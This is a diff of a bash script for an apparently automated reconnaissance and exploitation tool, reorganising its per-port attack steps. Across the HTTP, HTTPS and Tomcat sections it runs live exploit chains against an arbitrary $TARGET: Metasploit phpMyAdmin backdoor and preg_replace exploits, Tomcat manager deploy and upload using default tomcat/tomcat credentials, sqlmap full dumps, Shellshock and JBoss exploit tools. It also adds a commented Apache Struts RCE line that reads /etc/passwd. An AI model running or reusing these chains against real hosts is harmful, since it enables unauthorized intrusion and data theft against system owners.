@@ -428,16 +428,8 @@ else
 	echo ""
 	whatweb http://$TARGET
 	xsstracer $TARGET 80
-	echo ""
-
-	if [ $SCAN_TYPE == "DOMAIN" ];
-	then
-		goohak $TARGET > /dev/null
-		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
-		rm -Rf output/ cookie.txt exploits.conf
-	fi
 	
-	nmap -sV -T5 -p 80 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,http-phpmyadmin-dir-traversal $TARGET
+	echo ""
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10
 	echo ""
@@ -484,9 +476,6 @@ else
 	curl -s --insecure http://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10
 	curl -s --insecure http://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
 	echo ""
-	echo -e "$OKBLUE+ -- --=[Checking for Rom-0 Router Vulnerabilities on $TARGET...$RESET $OKORANGE"
-	curl -s --insecure http://$TARGET/rom-0 | grep 200 | tail -n 10
-	echo ""
 	echo -e "$RESET"
 
 	nikto -h http://$TARGET 
@@ -494,6 +483,7 @@ else
 	
 	if [ "$MODE" = "web" ]
 	then
+		nmap -v -sV -T5 -p 80 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,http-phpmyadmin-dir-traversal $TARGET
 		dirb http://$TARGET
 		wpscan --url http://$TARGET --batch
 		wpscan --url http://$TARGET/wordpress/ --batch
@@ -503,6 +493,14 @@ else
 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
+	fi
+	
+	if [ $SCAN_TYPE == "DOMAIN" ];
+	then
+		goohak $TARGET > /dev/null
+		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
+		rm -Rf output/ cookie.txt exploits.conf
+		GHDB="1"
 	fi
 fi
 
@@ -577,14 +575,6 @@ else
 	cd MassBleed
 	./massbleed $TARGET port 443
 	cd ..
-	nmap -sV -T5 -p 443 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,tls-nextprotoneg,ssl* $TARGET
-	
-	if [ $SCAN_TYPE == "DOMAIN" ];
-	then
-		goohak $TARGET > /dev/null
-		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt >> $LOOT_DIR/inurlbr-$TARGET.txt
-		rm -Rf output/ cookie.txt exploits.conf
-	fi
 	
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
@@ -633,11 +623,13 @@ else
 	curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
 	echo ""
 	echo -e "$RESET"
+	
 	nikto -h https://$TARGET 
 	cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
 	
 	if [ "$MODE" = "web" ]
 	then
+		nmap -v -sV -T5 -p 443 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,tls-nextprotoneg,ssl* $TARGET
 		dirb https://$TARGET
 		wpscan --url https://$TARGET --batch
 		wpscan --url https://$TARGET/wordpress/ --batch
@@ -647,6 +639,16 @@ else
 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
+	fi
+	
+	if [ $SCAN_TYPE == "DOMAIN" ]
+	then
+		if [ -z $GHDB ]
+		then
+			goohak $TARGET > /dev/null
+			php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
+			rm -Rf output/ cookie.txt exploits.conf
+		fi
 	fi
 fi
 
@@ -732,6 +734,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 3389 opened... running tests...$RESET"
 	nmap -sV -T5 --script=rdp-* -p 3389 $TARGET
+	rdesktop $TARGET &
 fi
 
 if [ -z "$port_3632" ]
@@ -800,7 +803,6 @@ else
 	cd ..
 	nikto -h http://$TARGET:8000 
 	cutycapt --url=http://$TARGET:8000 --out=loot/$TARGET-port8000.jpg
-	#arachni http://$TARGET:8000 --output-only-positives
 fi
 
 if [ -z "$port_8100" ]
@@ -819,7 +821,6 @@ else
 	cd ..
 	nikto -h http://$TARGET:8100 
 	cutycapt --url=http://$TARGET:8100 --out=loot/$TARGET-port8100.jpg
-	#arachni http://$TARGET:8100 --output-only-positives
 fi
 
 if [ -z "$port_8080" ]
@@ -839,8 +840,9 @@ else
 	nikto -h http://$TARGET:8080 
 	cutycapt --url=http://$TARGET:8080 --out=loot/$TARGET-port8080.jpg
 	nmap -p 8080 -T5 --script=*proxy* $TARGET
-	#arachni http://$TARGET:8080 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
+	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
 	python jexboss/jexboss.py http://$TARGET:8080
 	python jexboss/jexboss.py https://$TARGET:8080
 fi
@@ -862,7 +864,6 @@ else
 	nikto -h http://$TARGET:8180 
 	cutycapt --url=http://$TARGET:8180 --out=loot/$TARGET-port8180.jpg
 	nmap -p 8180 -T5 --script=*proxy* $TARGET
-	#arachni http://$TARGET:8180 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
@@ -883,7 +884,6 @@ else
 	nikto -h https://$TARGET:8443 
 	cutycapt --url=https://$TARGET:8443 --out=loot/$TARGET-port8443.jpg
 	nmap -p 8443 -T5 --script=*proxy* $TARGET
-	#arachni https://$TARGET:8443 --output-only-positives
 fi
 
 if [ -z "$port_10000" ]
